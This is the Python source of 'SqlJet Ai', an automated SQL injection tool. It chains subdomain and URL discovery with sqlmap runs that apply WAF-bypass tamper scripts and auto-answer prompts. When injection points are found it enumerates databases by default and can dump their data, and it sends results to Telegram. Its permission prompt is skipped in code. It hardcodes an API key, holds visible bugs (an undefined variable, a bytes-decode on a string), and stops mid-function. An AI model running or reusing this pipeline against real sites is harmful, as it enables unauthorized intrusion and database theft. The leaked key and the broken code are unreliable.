#!/usr/bin/env python3
"""
SQLInjectionScanner (Python Version)
Automated SQL Injection discovery & exploitation tool
"""

import os
import sys
import re
import time
import requests
import subprocess
import argparse
import json
from datetime import datetime
from atlas_integrator import find_best_tampers, sqlmap_with_tampers
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote_plus
import argparse
import shutil

# Import AI integration modules (will be skipped if not available)
try:
    from ai_integration import SqlJetAiIntegration, load_api_key, store_api_key
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

# Import colorama for cross-platform colored terminal text
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)  # Initialize colorama with autoreset to True
    COLORS_ENABLED = True
except ImportError:
    # Create mock color objects if colorama is not installed
    COLORS_ENABLED = False
    class MockColor:
        def __getattr__(self, name):
            return ''
    Fore = MockColor()
    Back = MockColor()
    Style = MockColor()

# Global dictionary to store absolute paths to various tools
TOOL_PATHS = {}

# Environment
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Set default ProjectDiscovery API key for Nuclei integration if not already set
if not os.environ.get("PDCP_API_KEY"):
    os.environ["PDCP_API_KEY"] = "caaece17-b50e-4270-8035-62c674979488"

# --- Get Base Directory of the script ---
# This helps locate sibling directories like 'tamper', 'results', etc.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TAMPER_DIR = os.path.join(SCRIPT_DIR, "tamper")
RESULTS_BASE_DIR = os.path.join(SCRIPT_DIR, "results")

# --- Color Functions ---
def info(msg):
    """Print info message in blue"""
    print(f"{Fore.BLUE}[*] {msg}{Style.RESET_ALL}")

def success(msg):
    """Print success message in green"""
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

def warning(msg):
    """Print warning message in yellow"""
    print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")

def error(msg):
    """Print error message in red"""
    print(f"{Fore.RED}[ERROR] {msg}{Style.RESET_ALL}")

def critical(msg):
    """Print critical error message in red with bright background"""
    print(f"{Fore.WHITE}{Back.RED}[CRITICAL] {msg}{Style.RESET_ALL}")

def vulnerable(msg):
    """Print vulnerability message in bright red"""
    print(f"{Fore.RED}{Style.BRIGHT}[VULNERABLE] {msg}{Style.RESET_ALL}")

def header(msg):
    """Print header in cyan with underline"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{msg}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * len(msg)}{Style.RESET_ALL}")

def send_telegram(message, log_file=None):
    """Send a message to Telegram channel if configured
    
    Args:
        message: The message to send
        log_file: Optional path to a log file where the message will also be logged
    
    Returns:
        bool: True if message was sent successfully, False otherwise
    """
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    
    # Always log to console
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] NOTIFICATION: {message}{Style.RESET_ALL}")
    
    # Log to file if specified
    if log_file:
        try:
            with open(log_file, 'a') as f:
                f.write(f"[{timestamp}] {message}\n")
        except IOError as e:
            print(f"{Fore.RED}[ERROR] Could not write to log file {log_file}: {e}{Style.RESET_ALL}")
    
    # Return if not configured
    if not bot_token or not chat_id:
        return False
        
    message = message.replace('"', '\\"')  # Escape double quotes for shell
    
    # Use requests instead of subprocess for better error handling
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={
                "chat_id": chat_id,
                "text": message
            },
            timeout=10
        )
        
        if response.status_code == 200:
            return True
        else:
            print(f"{Fore.YELLOW}[WARN] Telegram notification failed with status code {response.status_code}: {response.text}{Style.RESET_ALL}")
            return False
            
    except requests.RequestException as e:
        print(f"{Fore.YELLOW}[WARN] Telegram notification failed: {e}{Style.RESET_ALL}")
        return False

# Initialize tool paths (called once early to ensure paths are available)
def init_tool_paths():
    """Initialize the global TOOL_PATHS dictionary with paths to required tools"""
    global TOOL_PATHS
    # Get home directory and path to go binaries
    home_dir = os.path.expanduser("~")
    go_bin_dir = os.path.join(home_dir, "go", "bin")
    
    # Define tool paths, preferring Go bin directory if tools exist there
    TOOL_PATHS.update({
        "subfinder": os.path.join(go_bin_dir, "subfinder") if os.path.exists(os.path.join(go_bin_dir, "subfinder")) else "subfinder",
        "httpx": os.path.join(go_bin_dir, "httpx") if os.path.exists(os.path.join(go_bin_dir, "httpx")) else "httpx",
        "sqlmap": "sqlmap",  # Usually installed via pip or system package
        "gau": os.path.join(go_bin_dir, "gau") if os.path.exists(os.path.join(go_bin_dir, "gau")) else "gau",
        "waybackurls": os.path.join(go_bin_dir, "waybackurls") if os.path.exists(os.path.join(go_bin_dir, "waybackurls")) else "waybackurls",
        "katana": os.path.join(go_bin_dir, "katana") if os.path.exists(os.path.join(go_bin_dir, "katana")) else "katana",
        "nuclei": os.path.join(go_bin_dir, "nuclei") if os.path.exists(os.path.join(go_bin_dir, "nuclei")) else "nuclei"
    })

# Initialize tool paths early
init_tool_paths()

def check_tools(required_tools=None, skip_recon=False):
    """
    Check if the required tools are installed and set their paths.
    
    Args:
        required_tools: List of tools to check, defaults to [subfinder, httpx, sqlmap]
        skip_recon: If True, reconnaissance tools (subfinder) are optional
        
    Returns:
        bool: True if all required tools are installed, False otherwise
    """
    
    if required_tools is None:
        if skip_recon:
            # When skipping recon, subfinder is not required
            required_tools = ["httpx", "sqlmap", "katana", "gau", "nuclei"]
        else:
            required_tools = ["subfinder", "httpx", "sqlmap", "katana", "gau", "nuclei"]
    
    optional_tools = ["waybackurls"]
    missing_tools = []
    versions = {}
    
    for tool in required_tools:
        try:
            # Try to find the tool
            if tool in ["subfinder", "httpx", "gau", "waybackurls", "katana", "nuclei"]:
                # First check ~/go/bin explicitly
                go_bin_path = os.path.join(os.path.expanduser("~"), "go", "bin", tool)
                if os.path.exists(go_bin_path) and os.access(go_bin_path, os.X_OK):
                    # Tool found in go/bin
                    tool_path = go_bin_path
                    print(f"[DEBUG] Found {tool} at {tool_path}")
                else:
                    # Try with which command as fallback
                    which_proc = subprocess.run(["which", tool], capture_output=True, text=True)
                    if which_proc.returncode == 0:
                        # Tool found in PATH
                        tool_path = which_proc.stdout.strip()
                    else:
                        missing_tools.append(tool)
                        continue
            else:
                # Just check if tool exists
                result = subprocess.run(["which", tool], capture_output=True, text=True)
                if result.returncode == 0:
                    tool_path = result.stdout.strip()
                else:
                    missing_tools.append(tool)
                    continue
            
            # Check version
            if tool == "sqlmap":
                # Special handling for sqlmap to get version
                result = subprocess.run([tool, "--version"], capture_output=True, text=True)
                if result.returncode == 0:
                    version_match = re.search(r"(\d+\.\d+\.\d+[^\s]*)", result.stdout)
                    if version_match:
                        versions[tool] = version_match.group(1)
                    else:
                        versions[tool] = "unknown version"
                else:
                    missing_tools.append(tool)
            else:
                versions[tool] = "found"
        except Exception:
            missing_tools.append(tool)
            versions[tool] = "unknown version"
    
    # Check for optional tools
    missing_optional = []
    for tool in optional_tools:
        # Check both go/bin and PATH
        go_bin_path = os.path.join(os.path.expanduser("~"), "go", "bin", tool)
        if os.path.exists(go_bin_path) and os.access(go_bin_path, os.X_OK):
            # Tool found in go/bin
            print(f"[DEBUG] Found optional tool {tool} at {go_bin_path}")
            continue
            
        # Fallback to which command
        check_result = subprocess.run(["which", tool], capture_output=True, text=True)
        if check_result.returncode != 0:
            missing_optional.append(tool)
        else:
            versions[tool] = "found"
    
    if missing_tools:
        print(f"{Fore.RED}[ERROR] Missing required tools: {' '.join(missing_tools)}{Style.RESET_ALL}")
        return False, missing_tools
    else:
        print(f"{Fore.GREEN}[+] All required tools are installed:{Style.RESET_ALL}")
        for tool, version in versions.items():
            print(f"  - {tool}: {version if len(version) < 50 else 'found'}")
        
        if missing_optional:
            print(f"{Fore.YELLOW}[!] Some optional tools are not installed: {' '.join(missing_optional)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Functionality may be limited, but core features will work.{Style.RESET_ALL}")
        
        return True, []

def display_banner():
    banner = fr'''
    {Fore.CYAN}{Style.BRIGHT}  ______     _ ___      _      _     ___ 
 /  ___/ __ | |   \    | |    / \   |_ _|
 \___ \ / _` | |) |_  | |   / _ \   | | 
  ___) | (_| |  __/ |_| |  / ___ \  | | 
 |____/ \__, |_|  \___/  /_/   \_\ |___|
        |___/  {Fore.RED}Ai{Fore.CYAN} V1           {Style.RESET_ALL}

{Fore.GREEN}{Style.BRIGHT}       ~ by R13 ~{Style.RESET_ALL}

{Fore.YELLOW}Copyright (c) 2024-2025 SqlJet Ai developers by R13{Style.RESET_ALL}
    '''
    print(banner)

def prompt_confirm():
    display_banner()
    print(f"{Fore.YELLOW}{Style.BRIGHT}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT} SqlJet Ai - DISCLAIMER{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} SqlJet Ai is an open source penetration testing tool that{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} automates the process of detecting and exploiting SQL injection.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.RED} The developer is not responsible for any illegal use!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Ensure you have explicit permission to test the target domain!{Style.RESET_ALL}")
    print(f"{Fore.RED} Unauthorized testing may be illegal in your jurisdiction.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}{'=' * 60}{Style.RESET_ALL}")
    # Skip confirmation and automatically proceed
    print(f"{Fore.GREEN}[+] Running in automatic mode - no confirmation required{Style.RESET_ALL}")
    return True

def run_command(command, cwd=None, timeout=None, retry_count=1, retry_delay=2, show_output=True):
    """
    Run a command with subprocess and handle retries, with real-time output
    
    Args:
        command: Command to run (list or string)
        cwd: Working directory
        timeout: Timeout in seconds
        retry_count: Number of times to retry if command fails
        retry_delay: Delay between retries in seconds
        show_output: Whether to show output in real-time
        
    Returns:
        Tuple of (stdout, stderr, return_code)
    """
    for attempt in range(retry_count):
        try:
            # If command is a string, split it into a list
            if isinstance(command, str):
                cmd_list = command.split()
            else:
                cmd_list = command
                
            # Use different approach for real-time output
            if show_output:
                process = subprocess.Popen(
                    cmd_list,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,  # Merge stderr into stdout for simpler reading
                    text=True,
                    bufsize=1,  # Line buffered
                    universal_newlines=True,
                    cwd=cwd
                )
                
                # Collect output for return value
                all_output = []
                last_status_time = time.time()
                
                # Read output in real-time
                for line in iter(process.stdout.readline, ''):
                    all_output.append(line)
                    
                    # Only print non-empty lines
                    if line.strip():
                        print(line.rstrip())
                    
                    # Periodically print a status message for long-running processes
                    current_time = time.time()
                    if current_time - last_status_time > 15:  # Status update every 15 seconds
                        info(f"Still working... ({int(current_time - last_status_time)} seconds since last update)")
                        last_status_time = current_time
                    
                    # Flush stdout to ensure real-time display
                    sys.stdout.flush()
                
                # Wait for process to complete
                process.wait(timeout=timeout)
                stdout = ''.join(all_output)
                stderr = ''
            else:
                # Original approach without real-time output
                process = subprocess.Popen(
                    cmd_list,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=cwd
                )
                
                stdout, stderr = process.communicate(timeout=timeout)
            
            if process.returncode == 0:
                return stdout, stderr, process.returncode
                
            # If we get here, the command failed
            if attempt < retry_count - 1:
                warning(f"Command failed, retrying in {retry_delay}s... ({attempt+1}/{retry_count})")
                time.sleep(retry_delay)
            
        except subprocess.TimeoutExpired:
            process.kill()
            error(f"Command timed out after {timeout}s")
            return "", f"Command timed out after {timeout}s", 1
            
        except Exception as e:
            if attempt < retry_count - 1:
                error(f"Error running command: {e}, retrying in {retry_delay}s... ({attempt+1}/{retry_count})")
                time.sleep(retry_delay)
            else:
                return "", str(e), 1
    
    # If we get here, all retries failed
    return stdout, stderr, process.returncode

def collect_subdomains(domain, out_file, timeout=300, retry_count=2):
    """Enumerate subdomains using subfinder with timeout and retry capability
    
    Args:
        domain: Target domain to enumerate
        out_file: Output file to save results
        timeout: Maximum time to allow subfinder to run (seconds)
        retry_count: Number of retry attempts on failure
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[+] Starting subdomain enumeration for {domain}")
    print(f"[*] Enumerating subdomains for {domain}...")
    
    # Create command as list for better escaping using absolute path if available
    command = [TOOL_PATHS["subfinder"], "-d", domain, "-o", out_file]
    
    # Track start time for performance reporting
    start_time = time.time()
    
    result = run_command(command, timeout=timeout, retry_count=retry_count)
    if result: 
         elapsed = time.time() - start_time
         print(f"[+] Subdomain enumeration complete in {elapsed:.2f} seconds. Saved to {out_file}")
         
         # Verify output file was created and has content
         if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
             return True
         else:
             # File is empty or doesn't exist
             print(f"[WARN] Subfinder completed but output file is empty or missing")
             # Create a file with at least the target domain
             with open(out_file, 'w') as f:
                 f.write(f"{domain}\n")
             return True
    else:
        print(f"[ERROR] subfinder command failed. Using base domain {domain} as fallback")
        # Create a fallback file with just the base domain
        with open(out_file, 'w') as f:
            f.write(f"{domain}\n")
        return False

def collect_urls(sub_file, out_file):
    print("[*] Collecting URLs from multiple sources...")
    try:
        # Use a temporary file for each tool's output
        gau_temp_file = f"{out_file}.gau.tmp"
        waybackurls_temp_file = f"{out_file}.waybackurls.tmp"
        url_count = 0
        
        # Run gau for URL discovery
        print("[*] Collecting URLs via gau...")
        with open(sub_file, 'r') as f_in, open(gau_temp_file, 'w') as f_out:
            # Start cat process
            cat_proc = subprocess.Popen(["cat", sub_file], stdout=subprocess.PIPE, text=True)
            
            # Run gau command with absolute path if available
            gau_command = [TOOL_PATHS["gau"], "--threads", "20"]
            gau_proc = subprocess.Popen(gau_command, stdin=cat_proc.stdout, stdout=f_out, stderr=subprocess.PIPE, text=True)
            
            # Allow cat_proc to receive a SIGPIPE if gau_proc exits.
            cat_proc.stdout.close()
            
            # Wait for gau to finish and capture stderr
            stderr_output = gau_proc.communicate()[1]
            cat_proc.wait()
            gau_retcode = gau_proc.returncode
            
            if gau_retcode == 0:
                if os.path.exists(gau_temp_file) and os.path.getsize(gau_temp_file) > 0:
                    # Count lines/URLs found by gau
                    with open(gau_temp_file, 'r') as f:
                        gau_count = sum(1 for _ in f)
                    success(f"Found {gau_count} URLs via gau")
                    url_count += gau_count
                else:
                    warning("gau ran successfully but found no URLs")
            else:
                warning(f"gau command failed with return code {gau_retcode}")
                if stderr_output:
                    print(f"Stderr: {stderr_output.strip()}")
        
        # Run waybackurls for URL discovery with a timeout
        print("[*] Collecting URLs via waybackurls (with 60s timeout)...")
        try:
            with open(sub_file, 'r') as f_in, open(waybackurls_temp_file, 'w') as f_out:
                # Start cat process
                cat_proc = subprocess.Popen(["cat", sub_file], stdout=subprocess.PIPE, text=True)
                
                # Run waybackurls command with timeout and absolute path if available
                wayback_command = [TOOL_PATHS["waybackurls"]]
                wayback_proc = subprocess.Popen(wayback_command, stdin=cat_proc.stdout, stdout=f_out, stderr=subprocess.PIPE, text=True)
                
                # Allow cat_proc to receive a SIGPIPE if wayback_proc exits.
                cat_proc.stdout.close()
                
                # Setup timeout monitoring
                start_time = time.time()
                wayback_retcode = None
                stderr_output = ""
                
                # Wait for process with timeout
                while wayback_retcode is None and time.time() - start_time < 60:  # 60 second timeout
                    try:
                        wayback_retcode = wayback_proc.wait(timeout=1)
                        stderr_output = wayback_proc.stderr.read()
                    except subprocess.TimeoutExpired:
                        pass  # Continue waiting until our own timeout expires
                        
                # Kill process if it's still running after timeout
                if wayback_retcode is None:
                    warning("Waybackurls process timed out after 60 seconds, terminating")
                    wayback_proc.terminate()
                    try:
                        wayback_proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        wayback_proc.kill()
                    wayback_retcode = -1  # Indicate timeout
                
                cat_proc.wait(timeout=1)  # Brief timeout for cat process to finish
        except Exception as e:
            warning(f"Error during waybackurls process: {str(e)}")
            wayback_retcode = -1
            
            if wayback_retcode == 0:
                if os.path.exists(waybackurls_temp_file) and os.path.getsize(waybackurls_temp_file) > 0:
                    # Count lines/URLs found by waybackurls
                    with open(waybackurls_temp_file, 'r') as f:
                        wayback_count = sum(1 for _ in f)
                    success(f"Found {wayback_count} URLs via waybackurls")
                    url_count += wayback_count
                else:
                    warning("waybackurls ran successfully but found no URLs")
            else:
                warning(f"waybackurls command failed with return code {wayback_retcode}")
                if stderr_output:
                    print(f"Stderr: {stderr_output.strip()}")
        
        # Combine results from both tools and remove duplicates
        print("[*] Combining and deduplicating URLs from all sources...")
        url_set = set()
        
        # Add URLs from gau if available
        if os.path.exists(gau_temp_file) and os.path.getsize(gau_temp_file) > 0:
            with open(gau_temp_file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url:  # Skip empty lines
                        url_set.add(url)
        
        # Add URLs from waybackurls if available
        if os.path.exists(waybackurls_temp_file) and os.path.getsize(waybackurls_temp_file) > 0:
            with open(waybackurls_temp_file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url:  # Skip empty lines
                        url_set.add(url)
        
        # Write the combined, deduplicated set of URLs to the output file
        with open(out_file, 'w') as f_out:
            for url in url_set:
                f_out.write(f"{url}\n")
        
        # Clean up temporary files
        for temp_file in [gau_temp_file, waybackurls_temp_file]:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        
        # Report success with URL count
        if url_set:
            unique_count = len(url_set)
            success(f"URL collection complete. Found {url_count} total URLs, {unique_count} unique URLs after deduplication.")
            success(f"Saved raw URLs to {out_file}")
            return True
        else:
            warning(f"No URLs found from any source")
            return False

    except FileNotFoundError as e:
        # Could be cat, gau, or the input/output files
        print(f"[ERROR] File not found during URL collection: {e}")
        return False
    except IOError as e:
        print(f"[ERROR] I/O error during URL collection: {e}")
        return False
    except Exception as e:
        # Catch other potential exceptions
        print(f"[ERROR] An unexpected error occurred during URL collection: {e}")
        return False

def filter_urls(url_file, filtered_file):
    print(f"[*] Filtering URLs from {url_file} for parameters...")
    count = 0
    try:
        with open(url_file, 'r') as infile, open(filtered_file, 'w') as outfile:
            for line in infile:
                if '?' in line and '=' in line: 
                    outfile.write(line)
                    count += 1
        print(f"[+] Found {count} URLs with parameters. Saved to {filtered_file}")
        return count
    except FileNotFoundError:
        print(f"[ERROR] Input URL file not found: {url_file}")
        return 0
    except IOError as e:
        print(f"[ERROR] Failed reading/writing URL files: {e}")
        return 0

def check_live_urls(url_file, live_file):
    print("[*] Checking which URLs are live with httpx...")
    # Fix the httpx command to use -list instead of -l (or use file input method) with absolute path
    command = [
        TOOL_PATHS["httpx"], "-list", url_file,
        "-silent", "-status-code", "-mc", "200,201,204,301,302,307,308",
        "-threads", "50", 
        "-o", live_file
    ]
    if run_command(command):
        try:
            with open(live_file, 'r') as f:
                live_count = sum(1 for line in f if line.strip())
            print(f"[+] Found {live_count} live URLs with parameters. Saved to {live_file}")
            return live_count
        except FileNotFoundError:
             print(f"[INFO] httpx completed but output file {live_file} not found or empty.")
             return 0
        except IOError as e:
            print(f"[ERROR] Failed to read live URL file {live_file}: {e}")
            return 0
    else:
        print("[ERROR] httpx command failed.")
        return 0

def scan_with_sqlmap(live_urls_file, output_dir, tamper_scripts=None, level=1, risk=1, 
                  threads=10, prefix=None, suffix=None, auth_type=None, auth_cred=None, cookie=None, 
                  proxy=None, proxy_file=None, verbose=False, headers=None, get_dbs=False, get_tables=False, 
                  get_columns=False, dump_data=False, auto_enum_dbs=True, auto_waf=False, report_format=None, 
                  timeout=None, verify_ssl=True):
    # Check if the live_urls_file exists and is not empty
    if not os.path.exists(live_urls_file) or os.path.getsize(live_urls_file) == 0:
        warning(f"Live URLs file {live_urls_file} not found or empty. Creating a placeholder file.")
        # If the file doesn't exist or is empty, create a placeholder file with a test URL
        with open(live_urls_file, 'w') as f:
            # Use domain from the output_dir as a fallback
            domain = os.path.basename(output_dir).split('_')[0]
            f.write(f"http://{domain}/?test=1\n")
        info(f"Created placeholder file with test URL for {domain}")     
    """Runs SQLMap with specified options.
    
    Args:
        live_urls_file: File containing URLs to scan
        output_dir: Directory to store results
        tamper_scripts: Comma-separated list of tamper scripts to use
        level: SQLMap scan level (1-5)
        risk: SQLMap risk level (1-3)
        threads: Number of concurrent threads
        verbose: Enable verbose output
        prefix, suffix: SQL injection prefix/suffix
        auth_type, auth_cred, cookie: Authentication options
        proxy, proxy_file: Proxy settings
        get_dbs, get_tables, get_columns, dump_data: DB enumeration flags
        auto_waf: Automatic WAF detection and bypass
        report_format: Output report format (csv, html, json, etc.)
        timeout: Timeout in seconds for the sqlmap process
        auto_enum_dbs: Automatically enumerate databases when vulnerabilities are found
    
    Returns:
        dict: Dictionary with scan results including vulnerabilities found
    """
    """Runs SQLMap with specified options."""
    print(f"[*] Starting SQLMap scan on {live_urls_file}")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    sqlmap_log_file = os.path.join(output_dir, f"sqlmap_log_{timestamp}.txt")
    
    # Prepare for WAF detection if enabled
    detected_tampers = []
    if auto_waf:
        try:
            # Read the first URL from the file to detect WAF
            with open(live_urls_file, 'r') as f:
                first_url = f.readline().strip()
                if first_url:
                    print(f"[*] Testing for WAF presence using {first_url}")
                    
                    # Check if the URL likely has SQL injection parameters (to focus on the most promising ones)
                    likely_sql_params = ['id', 'cat', 'category', 'product', 'item', 'article', 'news', 'page', 'user', 'username', 'uid']
                    parsed_url = urlparse(first_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    # Check if any common SQL injection parameters are in the URL
                    has_likely_sql_param = False
                    for param in query_params:
                        if param.lower() in likely_sql_params:
                            has_likely_sql_param = True
                            print(f"[+] Found likely SQL injection parameter: {param}")
                    
                    custom_headers = {}
                    if headers:
                        # Convert header string to dictionary
                        for header_line in headers.split('\n'):
                            if ':' in header_line:
                                key, value = header_line.split(':', 1)
                                custom_headers[key.strip()] = value.strip()
                    
                    # Detect WAF and get recommended tampers
                    all_detected_tampers = find_best_tampers(first_url, headers=custom_headers)
                    # Select only the top 3 most effective tampers to keep scanning fast
                    detected_tampers = all_detected_tampers[:3] if len(all_detected_tampers) > 3 else all_detected_tampers
                    print(f"[+] WAF detection complete. Using top tampers: {', '.join(detected_tampers)}")
                    
                    # If user specified tampers, prioritize those over auto-detected ones
                    if tamper_scripts:
                        user_tampers = tamper_scripts.split(',')
                        # Use user-specified tampers first, then fill remaining slots with auto-detected ones
                        final_tampers = []
                        for t in user_tampers:
                            if len(final_tampers) < 3:
                                final_tampers.append(t)
                        
                        # Add some auto-detected tampers if we have room
                        for t in detected_tampers:
                            if t not in final_tampers and len(final_tampers) < 3:
                                final_tampers.append(t)
                        
                        detected_tampers = final_tampers
                        print(f"[+] Using optimized tampers: {', '.join(detected_tampers)}")
        except Exception as e:
            print(f"[!] Error during WAF detection: {e}")
            print(f"[*] Continuing with user-specified tampers if any")
    
    # We'll build the command below in the try block
    if proxy_file:
        proxy_file_path = os.path.abspath(proxy_file) # Ensure path is absolute
        if os.path.isfile(proxy_file_path):
            command.extend(["--proxy-file", proxy_file_path])
        else:
            print(f"[WARN] Proxy file not found: {proxy_file_path}. Ignoring --proxy-file.")
    try:
        sqlmap_log_file = os.path.join(output_dir, f"sqlmap_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        # Build command with proper argument formatting
        # Add --answers to automatically respond to all prompts with 'Y' for fully automatic operation
        cmd = [TOOL_PATHS["sqlmap"], "-m", live_urls_file, "--batch", "--answers=Y", "--level", str(level), "--risk", str(risk),
               "--threads", str(threads)]
        
        # Add options for database enumeration
        if get_dbs:
            cmd.append("--dbs")
        if get_tables:
            cmd.append("--tables")
        if get_columns:
            cmd.append("--columns")
        if dump_data:
            cmd.append("--dump")
        
        # Add verbose flag if requested
        if verbose:
            cmd.append("-v")
            cmd.append("3")
            
        # Add tamper scripts if provided (either from auto-waf or user), limiting to max 3 for speed
        tamper_to_use = None
        if detected_tampers:
            # Limit to 3 tamper scripts for faster execution
            limited_tampers = detected_tampers[:3] if len(detected_tampers) > 3 else detected_tampers
            tamper_to_use = ",".join(limited_tampers)
            print(f"[*] Using optimized tamper scripts for better performance: {tamper_to_use}")
        elif tamper_scripts:
            # If user specified tampers directly, limit to 3 at most
            user_tampers = tamper_scripts.split(",")
            limited_tampers = user_tampers[:3] if len(user_tampers) > 3 else user_tampers
            tamper_to_use = ",".join(limited_tampers)
            print(f"[*] Using user-specified tamper scripts (limited to 3): {tamper_to_use}")
            
        if tamper_to_use:
            cmd.append("--tamper")
            cmd.append(tamper_to_use)
            
        # Add other optional parameters if provided
        if prefix:
            cmd.append("--prefix")
            cmd.append(prefix)
        if suffix:
            cmd.append("--suffix")
            cmd.append(suffix)
        if auth_type and auth_cred:
            cmd.append("--auth-type")
            cmd.append(auth_type)
            cmd.append("--auth-cred")
            cmd.append(auth_cred)
        if cookie:
            cmd.append("--cookie")
            cmd.append(cookie)
        if proxy:
            cmd.append("--proxy")
            cmd.append(proxy)
        if proxy_file:
            cmd.append("--proxy-file")
            cmd.append(proxy_file)
        if headers:
            cmd.append("--headers")
            cmd.append(headers)
            
        # Add output directory
        cmd.append("--output-dir")
        cmd.append(output_dir)
            
        # Add report format if specified (and supported)
        if report_format:
            # Check if the format is txt (widely supported)
            if report_format.lower() == "txt":
                cmd.append("--text-output")
            # You can add other supported formats here as needed
            
        # Start SQLMap scan
        info(f"Running SQLmap command: {' '.join(cmd)}")
        info(f"SQLmap output will be logged to: {sqlmap_log_file}")
        
        tamper_msg = tamper_to_use if tamper_to_use else "none"
        send_telegram(f"Starting SQLMap scan on {live_urls_file}. Log: {sqlmap_log_file}. Tamper: {tamper_msg}")
        
        # Call sqlmap and capture output with real-time feedback
        stdout, stderr, return_code = run_command(cmd, show_output=True)
        if return_code != 0:
            error(f"SQLMap scan failed with return code {return_code}.")
            send_telegram(f"SQLMap scan failed for {live_urls_file}. Check system.")
            return {"vulnerable_found": False, "vulnerable_urls": []}
            
        # Save output to log file
        with open(sqlmap_log_file, 'w') as f:
            f.write(stdout)
            if stderr:
                f.write("\n\nSTDERR:\n")
                f.write(stderr)
                
        success(f"SQLmap scan complete. Full log: {sqlmap_log_file}")
        
        # Parse sqlmap output for vulnerable URLs
        try:
            with open(sqlmap_log_file, 'r') as f:
                log_content = f.read()
                
            # Check if SQLMap found vulnerabilities
            vulnerable_found = False
            vulnerable_urls = []
            
            if ("sqlmap identified the following injection point(s)" in log_content) or \
                    ("Parameter:" in log_content and "Type:" in log_content and "Title:" in log_content) or \
                    ("might be injectable" in log_content):
                    vulnerable("SQLMap found potential vulnerabilities! Check the log.")
                    
                    # Parse log for vulnerable URLs and parameters
                    url_pattern = re.compile(r"parameter '([^']+)' is (vulnerable|potentially vulnerable).*url='([^']+)'", re.IGNORECASE)
                    vuln_params = []
                    
                    for line in stdout.decode('utf-8', errors='ignore').splitlines():
                        url_match = url_pattern.search(line)
                        if url_match:
                            param, status, url = url_match.groups()
                            
                            # Store URL and parameter together for better reporting
                            if url not in vulnerable_urls:
                                vulnerable_urls.append(url)
                                
                            # Add parameter and URL information to vuln_params
                            vuln_params.append((param, url, status))
                    
                    # Display vulnerable parameters and URLs in terminal
                    if vuln_params:
                        header("SQL INJECTION VULNERABILITIES DETECTED")
                        print(f"{Fore.RED}{Style.BRIGHT}{'='*80}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}{'PARAMETER':<15} {'STATUS':<25} {'URL'}{Style.RESET_ALL}")
                        print(f"{Fore.RED}{Style.BRIGHT}{'='*80}{Style.RESET_ALL}")
                        
                        for param, url, status in vuln_params:
                            status_display = f"{status.upper()}"
                            vulnerable(f"{param:<15} {status_display:<25} {url}")
                            
                        print(f"{Fore.RED}{Style.BRIGHT}{'='*80}{Style.RESET_ALL}")
                    
                    # Write vulnerable URLs to a file
                    if vulnerable_urls:
                        vulnerable_urls_file = os.path.join(output_dir, "vulnerable_urls.txt")
                        with open(vulnerable_urls_file, 'w') as f:
                            for url in vulnerable_urls:
                                f.write(f"{url}\n")
                                
                        # Save detailed parameter information to a JSON file
                        if vuln_params:
                            vuln_details_file = os.path.join(output_dir, "vulnerability_details.json")
                            vuln_details = [{
                                "parameter": param,
                                "url": url,
                                "status": status
                            } for param, url, status in vuln_params]
                            
                            with open(vuln_details_file, 'w') as f:
                                json.dump(vuln_details, f, indent=2)
                                
                        success(f"Found {len(vulnerable_urls)} vulnerable URLs, saved to {vulnerable_urls_file}")
                    
                    send_telegram(f"SQLMap found potential vulnerabilities for {live_urls_file}! Check log: {sqlmap_log_file}")
                    vulnerable_found = True

            if not vulnerable_found:
                 header("SQL INJECTION TEST RESULTS")
                 warning("No SQL injection points were found. This site is not injectable or WAF is blocking the attacks.")
                 # Don't notify telegram if nothing found unless verbose mode is added later
                 # send_telegram(f"SQLMap scan finished for {live_urls_file}. No vulnerabilities reported.")
            elif auto_enum_dbs and vulnerable_urls:
                 # Automatically enumerate databases if vulnerable URLs were found
                 print("\n")
                 header("AUTOMATIC DATABASE ENUMERATION")
                 info(f"{Style.BRIGHT}Vulnerabilities found! Automatically enumerating databases...")
                 vulnerable_urls_file = os.path.join(output_dir, "vulnerable_urls.txt")
                 
                 # Run database enumeration directly
                 databases = run_dbs_enum(vulnerable_urls_file, output_dir, tamper_scripts, level, risk, 
                            prefix, suffix, auth_type, auth_cred, cookie, proxy, proxy_file, 
                            threads, verbose, True)  # True = return databases found

        except IOError as e:
             error(f"Could not read SQLmap log file {sqlmap_log_file}: {e}")
             send_telegram(f"SQLMap scan finished for {live_urls_file}, but couldn't read log.")
             return {"vulnerable_found": False, "vulnerable_urls": []}

    except FileNotFoundError:
